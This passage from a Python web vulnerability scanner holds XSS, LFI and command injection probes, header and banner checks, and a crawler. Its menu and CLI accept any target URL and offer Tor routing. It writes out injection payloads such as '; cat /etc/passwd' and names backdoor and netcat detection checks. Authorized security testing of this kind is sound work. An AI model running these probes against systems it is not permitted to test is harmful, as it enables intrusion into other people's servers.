                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "XSS", XSS_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "XSS", XSS_PAYLOADS, parameter=param):
                    found = True
            
            if not existing_params:
                common_xss_params = ["search", "query", "q", "callback", "redirect", "url", "returnurl"]
                for param in common_xss_params:
                    if check_vulnerability_patterns(test_url_base, "XSS", XSS_PAYLOADS, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during XSS scan: {str(e)}")
        return False

def lfi_scan(url):
    print_status(f"Scanning for Local File Inclusion (LFI) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    if check_vulnerability_patterns(form_url, "LFI", LFI_PAYLOADS, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True

        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    if check_vulnerability_patterns(link_url, "LFI", LFI_PAYLOADS, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                if check_vulnerability_patterns(url, "LFI", LFI_PAYLOADS, parameter=param):
                    found = True
            
            if not existing_params:
                common_lfi_params = ["#", "line", "&", ";", ":", "image?filename=", "page", "file", "path", "include", "document", "view"]
                for param in common_lfi_params:
                    if check_vulnerability_patterns(test_url_base, "LFI", LFI_PAYLOADS, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during LFI scan: {str(e)}")
        return False

def check_php_config_weakness(url):
    print_status(f"Checking for PHP configuration weaknesses at {url}...")
    found = False
    try:
        phpinfo_paths = ["/phpinfo.php", "/phpinfo.html", "/info.php", "/info.html", "/server-status"]
        for path in phpinfo_paths:
            phpinfo_url = urljoin(url, path)
            response = get_response(phpinfo_url)
            if response and response.status_code == 200 and ("PHP Credits" in response.text or "Server Status" in response.text):
                print_success(f"Found potential info disclosure page at: {phpinfo_url}")
                if re.search(AI_THREAT_PATTERNS["php_weak_config"], response.text, re.IGNORECASE):
                    print_risk("HIGH", f"PHP configuration weakness detected (disable_functions enabled) at {phpinfo_url}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "PHP Configuration Weakness",
                        'url': phpinfo_url,
                        'payload': 'N/A',
                        'severity': "HIGH",
                        'details': 'disable_functions are enabled, potentially allowing execution of restricted functions.',
                        'response_snippet': response.text
                    })
                    found = True
                return found 

        response = get_response(url)
        if response and response.text:
            if "PHP Version" in response.text or re.search(r"PHP/\d+\.\d+(\.\d+)?", response.text):
                print_success(f"PHP detected on {url}.")
                
        return found
    except Exception as e:
        print_error(f"Error checking PHP config weakness: {str(e)}")
        return False

def command_injection_scan(url):
    print_status(f"Scanning for Command Injection vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True})
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(form_url, "Command Injection", cmd_injection_payloads, parameter=param_name, method=method, data={i.get('name'): i.get('value') for i in form.find_all('input') if i.get('name')}):
                        found = True
                        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            if '?' in href:
                link_url = urljoin(url, href)
                parsed_url = urlparse(link_url)
                query_params = parse_qs(parsed_url.query)
                
                for param in query_params:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(link_url, "Command Injection", cmd_injection_payloads, parameter=param):
                        found = True
                        
        if not forms and '?' not in url:
            test_url_base = urlparse(url)._replace(query="").geturl()
            existing_params = parse_qs(urlparse(url).query)
            for param in existing_params:
                cmd_injection_payloads = [
                    "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                    "| cat /etc/passwd", "&& cat /etc/passwd",
                    "; whoami", "| whoami", "&& whoami"
                ]
                if check_vulnerability_patterns(url, "Command Injection", cmd_injection_payloads, parameter=param):
                    found = True
            
            if not existing_params:
                common_cmd_params = ["cmd", "command", "exec", "run", "ping", "traceroute", "query"]
                for param in common_cmd_params:
                    cmd_injection_payloads = [
                        "; ls", "| ls", "&& ls", "; cat /etc/passwd",
                        "| cat /etc/passwd", "&& cat /etc/passwd",
                        "; whoami", "| whoami", "&& whoami"
                    ]
                    if check_vulnerability_patterns(test_url_base, "Command Injection", cmd_injection_payloads, parameter=param):
                        found = True
                        break
        
        return found
    except Exception as e:
        print_error(f"Error during Command Injection scan: {str(e)}")
        return False

def check_ssh_vulnerabilities(url):
    print_status(f"Checking for SSH vulnerabilities at {url}...")
    found = False
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for SSH vulnerability check.")
            return False
            
        try:
            sock = socket.create_connection((domain, 22), timeout=5)
            banner = sock.recv(1024).decode(errors='ignore')
            sock.close()
            
            if banner:
                print_success(f"SSH Banner: {banner.strip()}")
                REPORT_DATA['SSH_Banners'].append(banner.strip())
                
                for vuln_banner in SSH_VULNS:
                    if vuln_banner in banner:
                        print_risk("HIGH", f"Vulnerable SSH version detected: {vuln_banner}")
                        REPORT_DATA['Vulnerabilities'].append({
                            'type': "SSH Vulnerability",
                            'url': f"ssh://{domain}:22",
                            'payload': 'N/A',
                            'severity': "HIGH",
                            'details': f"Vulnerable SSH version detected: {vuln_banner}",
                            'response_snippet': banner.strip()
                        })
                        found = True
        except (socket.timeout, ConnectionRefusedError):
            print_warning("SSH port (22) is closed or not responding.")
        except Exception as e:
            print_error(f"Error checking SSH vulnerabilities: {str(e)}")
            
        return found
    except Exception as e:
        print_error(f"Error during SSH vulnerability check: {str(e)}")
        return False

def check_patch_vulnerabilities(url):
    print_status(f"Checking for Patch Vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        server_header = response.headers.get('Server', '')
        if server_header:
            print_success(f"Server Header: {server_header}")
            
            for vuln_patch in PATCH_VULNS:
                if vuln_patch in server_header:
                    print_risk("HIGH", f"Vulnerable Server Version Detected: {vuln_patch}")
                    REPORT_DATA['Vulnerabilities'].append({
                        'type': "Patch Vulnerability",
                        'url': url,
                        'payload': 'N/A',
                        'severity': "HIGH",
                        'details': f"Vulnerable server version detected: {vuln_patch}",
                        'response_snippet': server_header
                    })
                    found = True
                    
        return found
    except Exception as e:
        print_error(f"Error during Patch Vulnerability check: {str(e)}")
        return False

def check_bug_bounty_vulnerabilities(url):
    print_status(f"Checking for Common Bug Bounty Vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        if "X-Frame-Options" not in response.headers:
            print_risk("MEDIUM", "Clickjacking vulnerability possible (Missing X-Frame-Options header)")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Clickjacking Vulnerability",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': "Missing X-Frame-Options header, potential clickjacking vulnerability",
                'response_snippet': str(response.headers)
            })
            found = True
            
        if "Content-Security-Policy" not in response.headers:
            print_risk("MEDIUM", "Content Security Policy (CSP) not implemented")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Missing CSP Header",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': "Content Security Policy (CSP) header not implemented",
                'response_snippet': str(response.headers)
            })
            found = True
            
        return found
    except Exception as e:
        print_error(f"Error during Bug Bounty Vulnerability check: {str(e)}")
        return False

def check_acv_vulnerabilities(url):
    print_status(f"Checking for Access Control Vulnerabilities (ACV) at {url}...")
    found = False
    try:
        for path in ACV_PAYLOADS:
            test_url = urljoin(url, path)
            response = get_response(test_url)
            if response and response.status_code == 200:
                print_risk("HIGH", f"Potential Access Control Vulnerability found at: {test_url}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Access Control Vulnerability",
                    'url': test_url,
                    'payload': 'N/A',
                    'severity': "HIGH",
                    'details': f"Sensitive file accessible: {path}",
                    'response_snippet': response.text[:500] if response.text else 'N/A'
                })
                found = True
        return found
    except Exception as e:
        print_error(f"Error during ACV check: {str(e)}")
        return False

def check_acsm_vulnerabilities(url):
    print_status(f"Checking for Access Control Security Model (ACSM) issues at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        missing_headers = []
        for header in ACSM_CHECKS:
            if header not in response.headers:
                missing_headers.append(header)
                
        if missing_headers:
            print_risk("MEDIUM", f"Missing security headers: {', '.join(missing_headers)}")
            REPORT_DATA['Vulnerabilities'].append({
                'type': "Missing Security Headers",
                'url': url,
                'payload': 'N/A',
                'severity': "MEDIUM",
                'details': f"Missing security headers: {', '.join(missing_headers)}",
                'response_snippet': str(response.headers)
            })
            found = True
            
        return found
    except Exception as e:
        print_error(f"Error during ACSM check: {str(e)}")
        return False

def check_backdoor_vulnerabilities(url):
    print_status(f"Checking for Backdoor vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response or not response.text:
            return False
            
        for pattern in BACKDOOR_PATTERNS:
            if re.search(pattern, response.text, re.IGNORECASE):
                print_risk("CRITICAL", f"Potential backdoor detected using pattern: {pattern}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Backdoor Vulnerability",
                    'url': url,
                    'payload': 'N/A',
                    'severity': "CRITICAL",
                    'details': f"Potential backdoor detected using pattern: {pattern}",
                    'response_snippet': response.text[:500]
                })
                found = True
                
        return found
    except Exception as e:
        print_error(f"Error during backdoor check: {str(e)}")
        return False

def check_netcat_vulnerabilities(url):
    print_status(f"Checking for Netcat (nc) vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response or not response.text:
            return False
            
        for pattern in NETCAT_CHECKS:
            if re.search(pattern, response.text, re.IGNORECASE):
                print_risk("CRITICAL", f"Potential Netcat (nc) backdoor detected: {pattern}")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Netcat Backdoor",
                    'url': url,
                    'payload': 'N/A',
                    'severity': "CRITICAL",
                    'details': f"Potential Netcat (nc) backdoor detected: {pattern}",
                    'response_snippet': response.text[:500]
                })
                found = True
                
        return found
    except Exception as e:
        print_error(f"Error during Netcat check: {str(e)}")
        return False

def crawl_website(url, limit):
    print_status(f"Starting website crawl from {url} (limit: {limit} pages)...")
    queue = deque([url])
    visited = {url}
    
    while queue and len(visited) < limit:
        current_url = queue.popleft()
        
        if len(visited) % 50 == 0: 
            print(f"  Crawled {len(visited)} pages...")
            
        try:
            response = get_response(current_url)
            if not response:
                continue
            
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link.get('href')
                    absolute_url = urljoin(current_url, href)
                    
                    parsed_link = urlparse(absolute_url)
                    clean_url = parsed_link._replace(fragment="").geturl()
                    
                    if urlparse(url).netloc in clean_url and clean_url not in visited:
                        visited.add(clean_url)
                        queue.append(clean_url)
                        
        except Exception as e:
            print_error(f"Error crawling {current_url}: {str(e)}")
            
    print_success(f"Website crawl finished. Visited {len(visited)} unique pages.")
    return visited

def full_scan(url):
    print_banner()
    print_status(f"Starting comprehensive scan for: {url}")
    
    print_status("Phase 1: Advanced Reconnaissance")
    dns_lookup(url)
    whois_lookup(url)
    geoip_lookup(url)
    grab_banners(url)
    nmap_scan(url)
    subdomain_scanner(url)
    reverse_ip_lookup(url)
    get_robots_txt(url)
    check_admin_panels(url) 
    
    print_status("\nPhase 2: Vulnerability Scanning")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(sql_injection_scan, url): "SQL Injection",
            executor.submit(xss_scan, url): "XSS",
            executor.submit(lfi_scan, url): "LFI",
            executor.submit(command_injection_scan, url): "Command Injection",
            executor.submit(check_php_config_weakness, url): "PHP Config Weakness",
            executor.submit(check_ssh_vulnerabilities, url): "SSH Vulnerabilities",
            executor.submit(check_patch_vulnerabilities, url): "Patch Vulnerabilities",
            executor.submit(check_bug_bounty_vulnerabilities, url): "Bug Bounty Vulnerabilities",
            executor.submit(check_acv_vulnerabilities, url): "Access Control Vulnerabilities",
            executor.submit(check_acsm_vulnerabilities, url): "Access Control Security Model",
            executor.submit(check_backdoor_vulnerabilities, url): "Backdoor Vulnerabilities",
            executor.submit(check_netcat_vulnerabilities, url): "Netcat Vulnerabilities"
        }
        
        for future in as_completed(futures):
            vuln_type = futures[future]
            try:
                if future.result():
                    print_success(f"{vuln_type} scan completed successfully (vulnerabilities reported).")
                else:
                    print_warning(f"{vuln_type} scan completed. No vulnerabilities of this type detected.")
            except Exception as e:
                print_error(f"Error during {vuln_type} scan: {str(e)}")

    print_status("\nPhase 3: Website Crawling")
    crawled_pages = crawl_website(url, CRAWL_LIMIT)
    
    print_status("\nPhase 4: Post-Crawl Analysis")
    if 'DisallowedPaths' in REPORT_DATA:
        print_status("Checking disallowed paths for potential access...")
        for path in REPORT_DATA['DisallowedPaths']:
            test_url = urljoin(url, path)
            response = get_response(test_url)
            if response and response.status_code in [200, 204, 301, 302, 307, 401, 403, 404, 405, 500]: 
                print_risk("MEDIUM", f"Disallowed path '{path}' might be accessible: {test_url} (Status: {response.status_code})")
                REPORT_DATA['Vulnerabilities'].append({
                    'type': "Accessible Disallowed Path",
                    'url': test_url,
                    'severity': "MEDIUM",
                    'details': f"robots.txt disallowed this path: {path}"
                })

    print_status("\nPhase 5: Generating Report")
    save_vulnerabilities(url)
    
    print_success(f"\nComprehensive scan for {url} completed.")

def interactive_menu(url):
    while True:
        print_banner()
        print(f"\n{YELLOW}Target URL: {url}{RESET}")
        print(f"\n{CYAN}Select an option:{RESET}")
        print(f"  {GREEN}1{RESET} - DNS Lookup")
        print(f"  {GREEN}2{RESET} - WHOIS Lookup")
        print(f"  {GREEN}3{RESET} - GeoIP Lookup")
        print(f"  {GREEN}4{RESET} - Banner Grabbing")
        print(f"  {GREEN}5{RESET} - NMAP Scan")
        print(f"  {GREEN}6{RESET} - Subdomain Scan")
        print(f"  {GREEN}7{RESET} - Reverse IP Lookup")
        print(f"  {GREEN}8{RESET} - Check robots.txt")
        print(f"  {GREEN}9{RESET} - Check Admin Panels")
        print(f"  {GREEN}10{RESET} - SQL Injection Scan")
        print(f"  {GREEN}11{RESET} - XSS Scan")
        print(f"  {GREEN}12{RESET} - LFI Scan")
        print(f"  {GREEN}13{RESET} - Command Injection Scan")
        print(f"  {GREEN}14{RESET} - PHP Config Check")
        print(f"  {GREEN}15{RESET} - SSH Vulnerabilities Check")
        print(f"  {GREEN}16{RESET} - Patch Vulnerabilities Check")
        print(f"  {GREEN}17{RESET} - Bug Bounty Checks")
        print(f"  {GREEN}18{RESET} - Website Crawling")
        print(f"\n  {BLUE}[A]{RESET} - Full Scan")
        print(f"  {BLUE}[D]{RESET} - Change Target URL")
        print(f"  {BLUE}[O]{RESET} - Generate Full Report")
        print(f"  {BLUE}[Y]{RESET} - Back to Main Menu")
        print(f"  {BLUE}[Q]{RESET} - Quit")
        
        choice = input("\nEnter your choice: ").strip().upper()
        
        if choice == '1':
            dns_lookup(url)
        elif choice == '2':
            whois_lookup(url)
        elif choice == '3':
            geoip_lookup(url)
        elif choice == '4':
            grab_banners(url)
        elif choice == '5':
            nmap_scan(url)
        elif choice == '6':
            subdomain_scanner(url)
        elif choice == '7':
            reverse_ip_lookup(url)
        elif choice == '8':
            get_robots_txt(url)
        elif choice == '9':
            check_admin_panels(url)
        elif choice == '10':
            sql_injection_scan(url)
        elif choice == '11':
            xss_scan(url)
        elif choice == '12':
            lfi_scan(url)
        elif choice == '13':
            command_injection_scan(url)
        elif choice == '14':
            check_php_config_weakness(url)
        elif choice == '15':
            check_ssh_vulnerabilities(url)
        elif choice == '16':
            check_patch_vulnerabilities(url)
        elif choice == '17':
            check_bug_bounty_vulnerabilities(url)
        elif choice == '18':
            crawl_website(url, CRAWL_LIMIT)
        elif choice == 'A':
            full_scan(url)
        elif choice == 'D':
            new_url = input("Enter new target URL: ").strip()
            if not new_url.startswith('http://') and not new_url.startswith('https://'):
                new_url = 'http://' + new_url
            url = new_url
            continue
        elif choice == 'O':
            save_vulnerabilities(url)
        elif choice == 'Y':
            return
        elif choice == 'Q':
            sys.exit(0)
        else:
            print_error("Invalid choice. Please try again.")
        
        input("\nPress Enter to continue...")

def main():
    parser = argparse.ArgumentParser(
        description=f"{BANNER}",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('url', nargs='?', help='Target URL for scanning (e.g., http://example.com)')
    parser.add_argument('-f', '--full', action='store_true', help='Perform a full scan including reconnaissance, vulnerability assessment, and crawling.')
    parser.add_argument('-r', '--recon', action='store_true', help='Perform reconnaissance scans (DNS, WHOIS, GeoIP, Banners, NMAP).')
    parser.add_argument('-v', '--vuln', action='store_true', help='Perform vulnerability scans (SQLi, XSS, LFI, Command Injection, PHP Config).')
    parser.add_argument('-c', '--crawl', action='store_true', help='Perform website crawling to discover pages.')
    parser.add_argument('-s', '--subdomains', action='store_true', help='Scan for subdomains.')
    parser.add_argument('-a', '--admin', action='store_true', help='Check for common admin panels.')
    parser.add_argument('-p', '--php', action='store_true', help='Check for PHP configuration weaknesses.')
    parser.add_argument('-ci', '--cmd-inject', action='store_true', help='Check for Command Injection vulnerabilities.')
    parser.add_argument('-ro', '--robots', action='store_true', help='Fetch and analyze robots.txt.')
    parser.add_argument('--tor', action='store_true', help='Use Tor network for requests (requires Tor to be running).')
    parser.add_argument('--save', action='store_true', help='Save the found vulnerabilities to a file.')
    
    args = parser.parse_args()
    
    global PROXIES
    if args.tor:
        PROXIES = TOR_PROXIES
        print_status("Using Tor network for requests.")
        
    if args.url:
        target_url = args.url
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            print_warning("URL does not start with http:// or https://. Assuming http://")
            target_url = 'http://' + target_url
            
        parsed_target = urlparse(target_url)
        if not parsed_target.netloc:
            print_error("Invalid URL provided.")
            return

        print_banner()
        
        if args.full:
            full_scan(target_url)
        else:
            tasks = []
            if args.recon:
                tasks.append(dns_lookup)
                tasks.append(whois_lookup)
                tasks.append(geoip_lookup)
                tasks.append(grab_banners)
                tasks.append(nmap_scan)
                tasks.append(subdomain_scanner)
                tasks.append(reverse_ip_lookup)
            if args.robots:
                tasks.append(get_robots_txt)
            if args.subdomains:
                tasks.append(subdomain_scanner)
            if args.admin:
                tasks.append(check_admin_panels)
            if args.php:
                tasks.append(check_php_config_weakness)
            if args.cmd_inject:
                tasks.append(command_injection_scan)
                
            if args.vuln:
                tasks.append(lambda u: sql_injection_scan(u))
                tasks.append(lambda u: xss_scan(u))
                tasks.append(lambda u: lfi_scan(u))
            
            if args.crawl:
                print_status("Website crawling initiated. This may take a while.")
                crawled_pages = crawl_website(target_url, CRAWL_LIMIT)

            if tasks:
                print_status("Starting selected scans...")
                for task in tasks:
                    try:
                        if task.__code__.co_argcount == 1:
                            task(target_url)
                        else: 
                            task()
                    except Exception as e:
                        print_error(f"Error executing task {getattr(task, '__name__', 'anonymous_task')}: {str(e)}")
            else:
                print_warning("No specific scan options were selected. Use -h for help.")

        if args.save:
            save_vulnerabilities(target_url)
            
        print_success("\nScan process finished.")
    else:
        #* By younis foynstrck*
        print_banner()
        target_url = input("Enter target URL (e.g., http://example.com): ").strip()
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            target_url = 'http://' + target_url
            
        parsed_target = urlparse(target_url)
        if not parsed_target.netloc:
            print_error("Invalid URL provided.")
            return
            
        interactive_menu(target_url)

if __name__ == "__main__":
    main()
